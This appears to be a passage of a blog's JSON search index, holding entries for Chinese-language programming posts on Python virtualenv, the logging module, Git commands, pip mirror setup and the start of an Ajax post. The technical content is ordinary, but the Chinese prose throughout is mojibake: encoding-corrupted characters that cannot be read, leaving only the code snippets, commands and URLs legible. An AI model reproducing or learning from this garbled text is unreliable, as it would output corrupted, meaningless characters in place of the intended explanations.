æ™®é€šç”¨æˆ·å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œç„¶ååœ¨è™šæ‹Ÿç¯å¢ƒä¸­ä»¥æ™®é€šç”¨æˆ·æƒé™å®‰è£…æ¨¡å—ï¼Œæ›´æ”¹ç¯å¢ƒå˜é‡ï¼Œè¿›è¡Œå¼€å‘å’Œè¿è¡Œpythonç¨‹åºè€Œä¸ä¼šå½±å“ç³»ç»Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡å’ŒPythonæ¨¡å—ã€‚ 2. åˆ›å»ºvirtualenvç¯å¢ƒè¾“å…¥virtualenv venvåˆ›å»ºåä¸ºvenvçš„è™šæ‹Ÿç¯å¢ƒã€‚åˆ›å»ºè™šæ‹Ÿç¯å¢ƒçš„å¸¸ç”¨é€‰é¡¹ï¼šâ€“no-site-packages ä¸ä½¿ç”¨ç³»ç»Ÿä¸­çš„site packagesâ€“system-site-package ä½¿ç”¨ç³»ç»Ÿä¸­çš„site packages (æ®è¯´æ˜¯é»˜è®¤ï¼Œä½†åœ¨æˆ‘è¿™é»˜è®¤æ˜¯ä¸ä½¿ç”¨çš„)-p PYTHON_EXE, --python=PYTHON_EXE ä½¿ç”¨æŒ‡å®šçš„pythonè§£é‡Šå™¨ï¼Œè¿™é‡Œçš„PYTHON_EXEåœ¨Windowsä¸‹éœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œæ¯”å¦‚C:\\Python27\\python.exe\\å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒå’Œç³»ç»Ÿé…ç½®æ–‡ä»¶æ¥è®¾ç½®virtualenvé»˜è®¤åˆ›å»ºé€‰é¡¹ï¼Œè¯¦æƒ…è§è¿™é‡Œã€‚è¾“å‡ºï¼š123G:\\&gt;virtualenv venvNew python executable in venv\\Scripts\\python.exeInstalling setuptools, pip, wheel...done. 3. è¿›å…¥åŠé€€å‡ºè™šæ‹Ÿç¯å¢ƒè¿›å…¥venvç›®å½•ï¼ŒLinuxä¸‹è¾“å…¥bin/activate, Windowsä¸‹è¾“å…¥Scripts\\activateè¿›å…¥è™šæ‹Ÿç¯å¢ƒã€‚12G:\\venv&gt;Scripts\\activate(venv) G:\\venv&gt;è¿›å…¥ç¯å¢ƒåï¼Œè¾“å…¥deactivateé€€å‡ºã€‚12(venv) G:\\venv&gt;deactivateG:\\venv&gt; 4. ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ 4.1 å®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—å®‰è£…è¿‡ç¨‹ä¸å¹³æ—¶ç›¸ç¬¦ï¼ˆæ¯”å¦‚ä½¿ç”¨pip install), åªä¸è¿‡å®‰è£…åçš„åŒ…ä¼šå­˜å‚¨åœ¨è™šæ‹Ÿç¯å¢ƒä¸­ã€‚ 4.2 è®¾ç½®ç¯å¢ƒå˜é‡Linuxä¸‹è¾“å…¥export VAR1=&quot;value1&quot;, Windowsä¸‹è¾“å…¥set VAR1=value1æ¥è®¾ç½®è™šæ‹Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡1234(venv) C:\\Users\\Stdio\\Desktop\\temp\\venv&gt;set VAR1=value1(venv) C:\\Users\\Stdio\\Desktop\\temp\\venv&gt;echo %VAR1%value1ç¯å¢ƒå˜é‡è®¾ç½®æˆåŠŸåï¼Œå³å¯åœ¨Pythonç¨‹åºä¸­åˆ©ç”¨è™šæ‹Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡è¿›è¡Œç¨‹åºé…ç½®ï¼ˆæ¯”å¦‚flaskä¸­çš„app.config.from_envvar(&quot;FLASK_SETTINGS&quot;)ï¼‰ã€‚è¯¥ç¯å¢ƒå˜é‡åªåœ¨è™šæ‹Ÿç¯å¢ƒä¸­æœ‰æ•ˆï¼Œé€€å‡ºè™šæ‹Ÿç¯å¢ƒåç¯å¢ƒå˜é‡å³æ¶ˆå¤±ã€‚ 5. å‚è€ƒæ–‡æ¡£Virtualenv - virtualenv 13.1.2 documentationVirtualenv - virtualenv 1.7.1.2.post1 documentation ä¸­æ–‡ç‰ˆvirtualenvå…¥é—¨æ•™ç¨‹virtualenv â€“ pythonè™šæ‹Ÿæ²™ç›’ç”¨virtualenvå»ºç«‹å¤šä¸ªPythonç‹¬ç«‹å¼€å‘ç¯å¢ƒ 6. åè®°åˆå¡«å®Œä¸€ä¸ªå‘ï¼Œæœ¬æ¥æ‰“ç®—æ˜¨å¤©å°±å†™å¥½çš„ï¼Œç»“æœæ˜¨å¤©æ²¡å†™å®Œâ€¦","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"virtualenv","slug":"virtualenv","permalink":"https://blog.stdioa.com/tags/virtualenv/"}]},{"title":"Pythonå­¦ä¹ ä¹‹logging","slug":"learning-python-logging","date":"2015-10-21T08:00:00.000Z","updated":"2018-07-12T00:14:48.044Z","comments":true,"path":"2015/10/learning-python-logging/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-logging/","excerpt":"ä»¥å‰å†™ä»£ç çš„æ—¶å€™ï¼Œæ‰€æœ‰ä¿¡æ¯åŒ…æ‹¬è°ƒè¯•ä¿¡æ¯å…¨éƒ¨è¾“å‡ºåœ¨å±å¹•ä¸Šï¼Œæœ‰çš„æ—¶å€™ä¼šçœ‹èµ·æ¥ä¹±ç³Ÿç³Ÿçš„ï¼Œè¿™æ—¶å°±éœ€è¦loggingæ¨¡å—æ¥è®°å½•ä¿¡æ¯æˆ–ç”Ÿæˆæ—¥å¿—æ–‡ä»¶ã€‚","text":"ä»¥å‰å†™ä»£ç çš„æ—¶å€™ï¼Œæ‰€æœ‰ä¿¡æ¯åŒ…æ‹¬è°ƒè¯•ä¿¡æ¯å…¨éƒ¨è¾“å‡ºåœ¨å±å¹•ä¸Šï¼Œæœ‰çš„æ—¶å€™ä¼šçœ‹èµ·æ¥ä¹±ç³Ÿç³Ÿçš„ï¼Œè¿™æ—¶å°±éœ€è¦loggingæ¨¡å—æ¥è®°å½•ä¿¡æ¯æˆ–ç”Ÿæˆæ—¥å¿—æ–‡ä»¶ã€‚ 1. ç®€ä»‹loggingæ˜¯ä¸€ä¸ªç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯çš„æ¨¡å—ï¼Œå®ƒå¯ä»¥è¾“å‡ºä¿¡æ¯åˆ°stdoutæˆ–è€…è‡ªå®šçš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ 2. åŸºæœ¬è¾“å‡ºä¿¡æ¯ï¼š12345logging.debug(\"A debug message\")logging.info(\"A info message\")logging.warn(\"A warning message\")logging.error(\"A error message\")logging.critical(\"A critical message\")æ—¥å¿—çº§åˆ«ï¼šloggingé»˜è®¤çš„æ—¥å¿—çº§åˆ«ä¸ºWARNINGï¼Œåœ¨å½“å‰çº§åˆ«ä¸‹ï¼Œåªæœ‰warningåŠä»¥ä¸Šçš„æ—¥å¿—å¯ä»¥è¢«è®°å½•ã€‚loggingçš„çº§åˆ«å¯é€šè¿‡logging.basicConfigæˆ–logging.setLevelæ¥ä¿®æ”¹ã€‚çº§åˆ«å¤§å°å…³ç³»ä¸ºCRITICAL(50) &gt; ERROR(40) &gt; WARNING(30) &gt; INFO(20) &gt; DEBUG(10) &gt; NOTSET(0), éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦è®°å½•ä¿¡æ¯ï¼Œloggingçš„æ—¥å¿—çº§åˆ«å°±ä¸å¯å†æ›´æ”¹ã€‚12345&gt;&gt;&gt; logging.basicConfig(level=logging.INFO)&gt;&gt;&gt; logging.info(\"Info\")INFO:root:Info&gt;&gt;&gt; logging.basicConfig(level=logging.DEBUG)&gt;&gt;&gt; logging.debug(\"Debug\") # æ²¡æœ‰è¾“å‡º 3. æ—¥å¿—æ ¼å¼è®¾ç½®åŠæ—¥å¿—æ–‡ä»¶æ“ä½œ12345678910111213import loggingimport timelogging.basicConfig(format=\"%(asctime)s %(levelname)s %(message)s\", datefmt=\"%Y %b %d %H:%M:%S\", filename=\"./log.log\", filemode=\"w\", # default is \"a\" level=logging.INFO)while True: for i in range(6): logging.log(i*10, \"a log\") # logging.log(level, msg) time.sleep(1)log.logè¾“å‡º(å¯ä»¥ç”¨tail -få‘½ä»¤å®æ—¶æŸ¥çœ‹):123456782015 Oct 21 14:41:36 INFO a log2015 Oct 21 14:41:37 WARNING a log2015 Oct 21 14:41:38 ERROR a log2015 Oct 21 14:41:41 CRITICAL a log2015 Oct 21 14:41:42 INFO a log2015 Oct 21 14:41:43 WARNING a log2015 Oct 21 14:41:44 ERROR a log2015 Oct 21 14:41:45 CRITICAL a log 4. å°†æ—¥å¿—è¾“å‡ºåˆ°å¤šä¸ªæµä¸­12345678910111213141516171819import loggingimport sys# å¯ä»¥é€šè¿‡logging.basicConfigè®¾ç½®ä¸€ä¸ªé»˜è®¤æµconsole = logging.StreamHandler(stream=sys.stdout) # é»˜è®¤æµä¸ºsys.stderrconsole.setLevel(logging.INFO)formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')console.setFormatter(formatter)logging.getLogger().addHandler(console)files = logging.FileHandler(\"log2.log\", mode=\"a\", encoding=\"utf-8\") # è®¾ç½®æ–‡ä»¶æµfiles.setLevel(logging.WARNING)formatter = logging.Formatter(\"%(levelname)s %(message)s\")files.setFormatter(formatter)logging.getLogger().addHandler(files)for i in range(1, 6): logging.log(i*10, logging.getLevelName(i*10).lower()) 5. è®¾ç½®å¤šä¸ªloggerä»¥è®°å½•ä¸åŒä¿¡æ¯123456789101112131415161718192021222324252627# coding: utf-8import loggingimport syslog1 = logging.Logger(\"0.0\")console = logging.StreamHandler(sys.stdout) # é»˜è®¤æµä¸ºsys.stderrconsole.setLevel(logging.INFO)formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')console.setFormatter(formatter)log1.addHandler(console)log2 = logging.Logger(\"-.-\")files = logging.FileHandler(\"log2.log\", mode=\"a\", encoding=\"utf-8\") # è®¾ç½®æ–‡ä»¶æµfiles.setLevel(logging.WARNING)formatter = logging.Formatter(\"%(name)s %(levelname)s %(message)s\")files.setFormatter(formatter)log2.addHandler(files)for i in range(1, 6): log1.log(i*10, logging.getLevelName(i*10).lower()) log2.log(i*10, logging.getLevelName(i*10).lower())logging.critical(\"AHHH! I'm the root logger but you forget me!\") # é»˜è®¤ä½¿ç”¨loggingæ—¶logger nameä¸º\"root\"logging.getLogger(\"root\").info(\"Of course not!\") 5. å‚è€ƒæ–‡æ¡£Logging HOWTOpython çš„æ—¥å¿—loggingæ¨¡å—å­¦ä¹  6. åè®°åˆå¡«å®Œä¸€ä¸ªå‘ï¼Œæœ€è¿‘è¦å¡«çš„å‘å¥½å¤šâ€¦","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"logging","slug":"logging","permalink":"https://blog.stdioa.com/tags/logging/"}]},{"title":"éšæ‰‹è®°ä¹‹Git","slug":"essay-git","date":"2015-10-14T10:28:00.000Z","updated":"2018-07-12T00:15:05.238Z","comments":true,"path":"2015/10/essay-git/","link":"","permalink":"https://blog.stdioa.com/2015/10/essay-git/","excerpt":"ä»ä¸€å¹´å‰å¼€å§‹ä½¿ç”¨Git, ä¸€ç›´æ²¡ç³»ç»Ÿæ•´ç†è¿‡Gitçš„å‘½ä»¤ï¼Œå‰å‡ å¤©åœ¨éƒ¨ç½²ä»£ç çš„æ—¶å€™å‡ºäº†é—®é¢˜ä¸çŸ¥é“è¯¥å¦‚ä½•è§£å†³ï¼Œäºæ˜¯å†³å®šæ•´ç†ä¸€ä»½Gitçš„ä½¿ç”¨æ–¹æ³•ã€‚æœ¬åšæ–‡ä¼šæŒç»­æ›´æ–°ã€‚","text":"ä»ä¸€å¹´å‰å¼€å§‹ä½¿ç”¨Git, ä¸€ç›´æ²¡ç³»ç»Ÿæ•´ç†è¿‡Gitçš„å‘½ä»¤ï¼Œå‰å‡ å¤©åœ¨éƒ¨ç½²ä»£ç çš„æ—¶å€™å‡ºäº†é—®é¢˜ä¸çŸ¥é“è¯¥å¦‚ä½•è§£å†³ï¼Œäºæ˜¯å†³å®šæ•´ç†ä¸€ä»½Gitçš„ä½¿ç”¨æ–¹æ³•ã€‚æœ¬åšæ–‡ä¼šæŒç»­æ›´æ–°ã€‚ 1. ä»€ä¹ˆæ˜¯GitLinuså¤§ç¥å†™çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œå…·ä½“è¯·è®¿é—®å®˜ç½‘http://git-scm.com.Wikipediaé“¾æ¥: Git (software) 2. åŸºæœ¬æ“ä½œåˆå§‹åŒ–ç‰ˆæœ¬ä»“åº“: git initä»è¿œç¨‹ä»“åº“å…‹éš†: git clone [url] [repo_name]ä¾‹: git clone https://github.com/user/repo my_repoæ–‡ä»¶çš„çŠ¶æ€å˜åŒ–å‘¨æœŸæ£€æŸ¥æ–‡ä»¶çŠ¶æ€: git statusçŠ¶æ€ç®€è§ˆ: git status -s123456$ git status -s M READMEMM RakefileA lib/git.rbM lib/simplegit.rb?? LICENSE.txtå­—æ¯æ‰€ä»£è¡¨çš„çŠ¶æ€??æœªè¿½è¸ª Må·²ä¿®æ”¹ï¼Œæœªæš‚å­˜MMä¿®æ”¹åæš‚å­˜ï¼Œç„¶ååˆä¿®æ”¹Aæ–°æ·»åŠ åˆ°æš‚å­˜åŒºMä¿®æ”¹åæ·»åŠ åˆ°æš‚å­˜åŒºå¿½ç•¥æ–‡ä»¶ï¼š ç¼–è¾‘.gitignoreæ–‡ä»¶ã€‚æ–‡ä»¶ .gitignore çš„æ ¼å¼è§„èŒƒå¦‚ä¸‹ï¼šæ‰€æœ‰ç©ºè¡Œæˆ–è€…ä»¥ ï¼ƒ å¼€å¤´çš„è¡Œéƒ½ä¼šè¢« Git å¿½ç•¥ã€‚å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„ glob æ¨¡å¼åŒ¹é…ã€‚åŒ¹é…æ¨¡å¼å¯ä»¥ä»¥ï¼ˆ/ï¼‰å¼€å¤´é˜²æ­¢é€’å½’ã€‚åŒ¹é…æ¨¡å¼å¯ä»¥ä»¥ï¼ˆ/ï¼‰ç»“å°¾æŒ‡å®šç›®å½•ã€‚è¦å¿½ç•¥æŒ‡å®šæ¨¡å¼ä»¥å¤–çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå¯ä»¥åœ¨æ¨¡å¼å‰åŠ ä¸ŠæƒŠå¹å·ï¼ˆ!ï¼‰å–åã€‚å…·ä½“ä¾‹å­è§Git-åŸºç¡€ã€‚æŸ¥çœ‹å°šæœªæš‚å­˜çš„æ–‡ä»¶æ›´æ–°éƒ¨åˆ†: git diffæŸ¥çœ‹å·²æš‚å­˜çš„æ–‡ä»¶æ›´æ–°çš„éƒ¨åˆ†: git diff --stagedæäº¤æ›´æ–°: git commitgit commit -a = git add --all; git commitæäº¤æ—¶è¾“å…¥å•è¡Œä¿¡æ¯(Commit log): git commit -mæ·»åŠ æ–‡ä»¶: git add [filename], ä½¿gitè·Ÿè¸ªæ–‡ä»¶åˆ é™¤æ–‡ä»¶: git rm [filename], ä½¿gitåœæ­¢è·Ÿè¸ªæ–‡ä»¶å¹¶å°†æ–‡ä»¶åˆ é™¤åœæ­¢è·Ÿè¸ªæ–‡ä»¶: git rm --cached, åœæ­¢è·Ÿè¸ªä½†ä¸åˆ é™¤æ–‡ä»¶ç§»åŠ¨æ–‡ä»¶: git mv, è§„åˆ™å’ŒmvåŸºæœ¬ç›¸åŒæŸ¥çœ‹æäº¤å†å²: git logæ˜¾ç¤ºæ¯æ¬¡æäº¤çš„å†…å®¹å·®å¼‚: git log -pæŸ¥çœ‹æ¯æ¬¡æäº¤çš„ç®€ç•¥ç»Ÿè®¡ä¿¡æ¯: git log --statæŸ¥çœ‹æ¯æ¬¡æäº¤çš„ä»£ç æ›´æ”¹è¯¦æƒ…ï¼šgit log --ccæ˜¾ç¤ºASCIIå›¾å½¢è¡¨ç¤ºçš„åˆ†æ”¯åˆå¹¶å†å²: git log --graphç²—ç•¥æ˜¾ç¤º: git log --oneline --graph --decorate --allæ›´å¤šè¯·è¾“å…¥git log --helpæŸ¥çœ‹man page.æ›´æ”¹ä¸Šæ¬¡æäº¤: git commit --amendå–æ¶ˆæš‚å­˜: git reset HEAD [filename]å–æ¶ˆæš‚å­˜å¹¶ä¸¢å¼ƒç°æœ‰çš„æ›´æ”¹: git reset HEAD --hard [filename], æœªæäº¤çš„æ›´æ”¹ä¼šä¸¢å¤±æ’¤é”€å¯¹æ–‡ä»¶çš„æ›´æ”¹: git checkout -- [filename], æœªæäº¤çš„æ›´æ”¹ä¼šä¸¢å¤±git push origin --delete [branch], åˆ é™¤è¿œç¨‹åˆ†æ”¯ 3. åˆ†æ”¯æ“ä½œgit branch [branch], åœ¨å½“å‰å¼•ç”¨ä¸Šå»ºç«‹æ–°åˆ†æ”¯git checkout -b [branch], å»ºç«‹æ–°åˆ†æ”¯å¹¶æ£€å‡ºåˆ°è¯¥åˆ†æ”¯ä¸Šcommitå¼•ç”¨æ–¹å¼:ç›´æ¥hashå¼•ç”¨: d921970aadf03b3cf0e71becdaab3147ba71cdef, d921970åˆ†æ”¯å¼•ç”¨: HEAD, masterç›¸å¯¹å¼•ç”¨: HEAD^, HEAD^^, HEAD~2è‹¥aæ˜¯ä¸€ä¸ªåˆå¹¶æäº¤ï¼Œæœ‰ä¸¤ä¸ªçˆ¶å¼•ç”¨ï¼Œåˆ™a^ä¸ºaçš„ç¬¬ä¸€çˆ¶å¼•ç”¨ï¼Œa^2ä¸ºaçš„ç¬¬äºŒçˆ¶å¼•ç”¨ã€‚æ¡ä»¶å¼•ç”¨: master@{yesterday}, master@{1.week.before}å¼•ç”¨åŒºé—´:refA..refBé€‰æ‹©ä»refAå’ŒrefBçš„å…±åŒç¥–å…ˆå¼€å§‹ç›´åˆ°refBçš„æ‰€æœ‰æäº¤ã€‚ä¾‹:1234è‹¥ 1 - 2 - 3 - 4 â† refA \\ 5 - 6 â† refBrefA..refB å³ä¸º6 5, refB..refA å³ä¸º4 3.origin/master..masterä¸ºmasteråˆ†æ”¯ä¸Šè¿˜æœªæäº¤åˆ°è¿œç«¯çš„æ‰€æœ‰å¼•ç”¨åŒºé—´ç­›é€‰ï¼Œä¾‹ï¼šä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ç­‰ä»·ï¼š$ git log refA..refB$ git log ^refA refB$ git log refB --not refArefA...refBé€‰æ‹©å‡ºè¢«ä¸¤ä¸ªå¼•ç”¨ä¸­çš„ä¸€ä¸ªåŒ…å«ä½†åˆä¸è¢«ä¸¤è€…åŒæ—¶åŒ…å«çš„æäº¤ï¼Œå³refA..refB+refB..refA12345$ git log --left-to-right refA...refB&lt; 4&lt; 3&gt; 6&gt; 5 4. å·¥ä½œå‚¨è—git stash &quot;comments&quot;, å‚¨è—æ‰€æœ‰å·¥ä½œï¼ŒåŒ…æ‹¬å·²æ·»åŠ çš„å’Œå·²æ›´æ”¹æœªæ·»åŠ çš„git stash apply stash@{0}, æ¢å¤å‚¨è—ï¼Œå¯èƒ½ä¼šäº§ç”Ÿå†²çªï¼Œè§£å†³å†²çªågit addæ·»åŠ git stash list, åˆ—å‡ºå‚¨è—æ ˆgit stash show [stashname], æŸ¥çœ‹å‚¨è—çš„æ›´æ”¹git stash pop, åº”ç”¨æ ˆé¡¶å‚¨è—å¹¶å¼¹å‡ºå‚¨è—git stash drop [stashname], åˆ é™¤å‚¨è—git stash branch [branchname], åº”ç”¨å‚¨è—åˆ°æŸåˆ†æ”¯å¹¶åˆ‡æ¢åˆ°è¯¥åˆ†æ”¯git stash --keep-index, åªå‚¨è—å·²æ›´æ”¹æœªæ·»åŠ çš„æ”¹åŠ¨ï¼Œä¸å‚¨è— å·²æ·»åŠ çš„git stash --include-untracked, å‚¨è—æœªè¿½è¸ªçš„æ–‡ä»¶ï¼ˆæœªè¿½è¸ªæ–‡ä»¶ï¼‰å¹¶å°†å…¶ä»å·¥ä½œç›®å½•ä¸­åˆ é™¤git stash --all, è´®è—æ‰€æœ‰æ–‡ä»¶ 5. git resetgit reset --soft HEAD^, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­æ‰€æœ‰çš„æ–‡ä»¶å‡æ·»åŠ æš‚å­˜(staged), ç±»ä¼¼â€œæ’¤é”€git commitå‘½ä»¤â€ï¼Œä½†å¦‚æœé‡æ–°æäº¤ï¼Œä¼šåˆ›é€ ä¸€ä¸ªhashä¸åŒçš„commitï¼Œå³æ—¶æäº¤å†…å®¹å®Œå…¨ç›¸åŒã€‚git reset --mixed HEAD^, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­çš„æ›´æ”¹æœªæš‚å­˜(modified but not staged), ç±»ä¼¼â€œæ’¤é”€git addå’Œgit commitå‘½ä»¤â€git reset --hard HEAD^, å°†HEADæŒ‡é’ˆåŠå½“å‰åˆ†æ”¯æŒ‡é’ˆæŒ‡å‘HEAD^, å·¥ä½œç›®å½•ä¸­çš„æ›´æ”¹å®Œå…¨ä¸¢å¤±ï¼Œç›¸å½“äºâ€œæ’¤é”€æ›´æ”¹, git addå’Œgit commitâ€.","categories":[{"name":"éšæ‰‹è®°","slug":"éšæ‰‹è®°","permalink":"https://blog.stdioa.com/categories/éšæ‰‹è®°/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://blog.stdioa.com/tags/Git/"},{"name":"ç¼–ç¨‹å·¥å…·","slug":"ç¼–ç¨‹å·¥å…·","permalink":"https://blog.stdioa.com/tags/ç¼–ç¨‹å·¥å…·/"}]},{"title":"éšæ‰‹è®° - ç”¨å›½å†…é•œåƒåŠ é€Ÿpip","slug":"essay-pip-acceleration","date":"2015-09-29T15:01:00.000Z","updated":"2018-07-12T00:15:04.549Z","comments":true,"path":"2015/09/essay-pip-acceleration/","link":"","permalink":"https://blog.stdioa.com/2015/09/essay-pip-acceleration/","excerpt":"åŸæ¥Windowså’ŒLinuxæ›´æ”¹é•œåƒæºçš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„å•Šã€‚","text":"åŸæ¥Windowså’ŒLinuxæ›´æ”¹é•œåƒæºçš„æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„å•Šã€‚ 1. å¼•å­å¶ç„¶å‘ç°USTCæœ‰ä¸€ä¸ªpypiçš„æº(åœ¨è¿™é‡Œ)ï¼Œç…§ç€USTCç»™çš„é•œåƒä½¿ç”¨å¸®åŠ©æ›´æ”¹é•œåƒæºæ— æœã€‚ä»Šå¤©é—²æ¥æ— äº‹å°±å¤šæœäº†ä¸€ä¸‹ã€‚ 2. è¿‡ç¨‹USTCçš„é•œåƒä½¿ç”¨å¸®åŠ©é‡Œè¯´ï¼Œå°†index-url = https://pypi.mirrors.ustc.edu.cn/simpleæ·»åŠ åˆ°~/.pip/pip.confæ–‡ä»¶ä¸­ï¼ŒæŒ‰ç…§æ­¤æ€è·¯çœ‹ï¼Œå¦‚æœæˆ‘åœ¨Windowsä¸‹ä½¿ç”¨çš„è¯ï¼Œåº”è¯¥å°†é…ç½®ä¿¡æ¯æ·»åŠ åˆ°C:\\Users\\Stdio\\.pip\\pip.confæ–‡ä»¶ä¸­ã€‚ç„¶è€Œæ·»åŠ åå¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ã€‚ä»Šå¤©çœ‹è§ä¸€ä¸ªåšæ–‡è¯´æ–‡ä»¶è®¾ç½®è·¯å¾„åº”ä¸º%HOME%\\pip\\pip.iniï¼Œäºæ˜¯è¯•äº†ä¸€ä¸‹ï¼ˆç»å¯¹è·¯å¾„ä¸ºC:\\Users\\Stdio\\pip\\pip.iniï¼‰ï¼ŒæˆåŠŸã€‚ç”¨äº†USTCçš„æºï¼Œè£…ä¸ªè½¯ä»¶é€Ÿåº¦ç®€ç›´é£èµ·ï¸¿(ï¿£ï¸¶ï¿£)ï¸¿å¼„å¥½ä»¥åå¤šäº†ä¸ªå¿ƒçœ¼ï¼Œå»çœ‹çœ‹å®˜æ–¹æ€ä¹ˆè¯´ï¼Œäºæ˜¯æ‰¾åˆ°äº†pipçš„Documentationï¼ˆåœ¨è¿™é‡Œï¼‰é‡Œé¢è®²è¿°äº†é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®ã€‚1234567891011121314151617181920Config filepip allows you to set all command line option defaults in a standard ini style config file.The names and locations of the configuration files vary slightly across platforms. You may have per-user, per-virtualenv or site-wide (shared amongst all users) configuration:Per-user:On Unix the default configuration file is: $HOME/.config/pip/pip.conf which respects the XDG_CONFIG_HOME environment variable.On Mac OS X the configuration file is $HOME/Library/Application Support/pip/pip.conf.On Windows the configuration file is %APPDATA%\\pip\\pip.ini.There are also a legacy per-user configuration file which is also respected, these are located at:On Unix and Mac OS X the configuration file is: $HOME/.pip/pip.confOn Windows the configuration file is: %HOME%\\pip\\pip.iniYou can set a custom path location for this config file using the environment variable PIP_CONFIG_FILE.Inside a virtualenv:On Unix and Mac OS X the file is $VIRTUAL_ENV/pip.confOn Windows the file is: %VIRTUAL_ENV%\\pip.iniäºæ˜¯è‡ªå·±å°†é…ç½®æ–‡ä»¶æ”¾åœ¨äº†%APPDATA%\\pip\\pip.iniï¼Œå³C:\\Users\\Stdio\\AppData\\Roaming\\pip\\pip.iniä¸‹ï¼Œç»å®éªŒï¼ŒåŠ é€ŸæˆåŠŸã€‚ç»æµ‹è¯•ï¼Œç³»ç»Ÿå±‚é¢çš„å…¨å±€è®¾ç½®ä¼šå½±å“åˆ°virtualenvå»ºç«‹çš„è™šæ‹Ÿç¯å¢ƒè®¾ç½®ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è®¾ç½®è™šæ‹Ÿç¯å¢ƒçš„é…ç½®æ–‡ä»¶æ¥æ›´æ”¹è™šæ‹Ÿç¯å¢ƒè®¾ç½®ï¼Œè®¾ç½®æ–‡ä»¶å°±æ”¾åœ¨è™šæ‹Ÿç¯å¢ƒæ ¹ç›®å½•ä¸‹å°±å¥½äº†ã€‚ 3. çå†™æ”¹äº†è½¯ä»¶æºä»¥åä¸ºäº†åšæµ‹è¯•å‡çº§äº†numpyï¼Œç„¶åç¼–è¯‘ç”¨äº†åŠå¤©ä¸­é—´ç”µè„‘å¡åˆ°æ­»ï¼Œç°åœ¨å®ƒè¿˜åœ¨æˆ‘çš„è…¿ä¸Šå‘çƒ«çœŸæ˜¯ä¼¤ä¸èµ·- -å†™çš„ä¸œè¥¿è¶Šæ¥è¶Šæ²¡æœ‰è¥å…»äº†ï¼Œå°±å½“æ˜¯å†™ç€ç©é¡ºå¸¦ç§¯ç´¯ä¸€ä¸‹çŸ¥è¯†å§ã€‚å¦‚æœä¸å‡ºæ„å¤–çš„è¯ï¼Œä¸‹ä¸€ç¯‡åº”è¯¥æ˜¯å…³äºPython Qt Createrå’ŒQt GUIè®¾è®¡çš„å°æ–‡ç« 0.0ä¹Ÿè®¸æ˜¯virtualenvçš„éšæ‰‹è®°å§ã€‚","categories":[{"name":"éšæ‰‹è®°","slug":"éšæ‰‹è®°","permalink":"https://blog.stdioa.com/categories/éšæ‰‹è®°/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"pip","slug":"pip","permalink":"https://blog.stdioa.com/tags/pip/"}]},{"title":"ç‚¹ç‚¹æŠ€èƒ½ç‚¹ä¹‹Ajax","slug":"essay-ajax","date":"2015-09-22T13:07:00.000Z","updated":"2018-07-12T00:15:06.869Z","comments":true,"path":"2015/09/essay-ajax/","link":"","permalink":"https://blog.stdioa.com/2015/09/essay-ajax/","excerpt":"ä¹‹å‰è‡ªå·±æ²¡æ€ä¹ˆå†™è¿‡å‰ç«¯ï¼Œä¸€ç›´ä»¥ä¸ºAjaxå†™èµ·æ¥å¾ˆéº»çƒ¦ï¼Œä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦Ajaxï¼Œä»Šå¤©å†™äº†ä¸ªå°ç½‘é¡µç”¨åˆ°äº†Ajaxï¼Œæ„Ÿè§‰å®ƒå¹¶ä¸æ˜¯æƒ³è±¡çš„é‚£ä¹ˆå¤æ‚ï¼Œå†™å®Œç½‘é¡µéšæ‰‹æ€»ç»“ä¸€ä¸‹ã€‚ï¼ˆå–‚æˆ‘è¿™ä¸ªæŠ€èƒ½ç‚¹æ˜¯ä¸æ˜¯ç‚¹çš„å¤ªæ™šäº†å•Šï¼ï¼‰","text":"ä¹‹å‰è‡ªå·±æ²¡æ€ä¹ˆå†™è¿‡å‰ç«¯ï¼Œä¸€ç›´ä»¥ä¸ºAjaxå†™èµ·æ¥å¾ˆéº»çƒ¦ï¼Œä¹Ÿæ²¡æ€ä¹ˆæ¥è§¦Ajaxï¼Œä»Šå¤©å†™äº†ä¸ªå°ç½‘é¡µç”¨åˆ°äº†Ajaxï¼Œæ„Ÿè§‰å®ƒå¹¶ä¸æ˜¯æƒ³è±¡çš„é‚£ä¹ˆå¤æ‚ï¼Œå†™å®Œç½‘é¡µéšæ‰‹æ€»ç»“ä¸€ä¸‹ã€‚ï¼ˆå–‚æˆ‘è¿™ä¸ªæŠ€èƒ½ç‚¹æ˜¯ä¸æ˜¯ç‚¹çš„å¤ªæ™